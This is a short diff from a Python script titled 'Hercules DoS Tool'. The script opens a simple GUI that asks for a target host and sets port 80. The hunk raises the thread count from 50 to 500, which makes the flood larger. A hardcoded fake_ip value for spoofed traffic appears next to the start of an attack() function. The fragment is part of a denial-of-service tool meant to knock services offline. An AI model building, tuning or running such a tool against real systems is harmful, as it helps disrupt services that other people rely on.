@@ -14,7 +14,7 @@ layout = [[sg.Text("Hercules")],
 window = sg.Window(title="Hercules DoS Tool", layout=layout, margins=(100,150))
 target = window.read()[1][0]
 port = 80
-Trd = 50
+Trd = 500
 fake_ip = '44.197.175.168'
 attack_num = 0
 def attack():
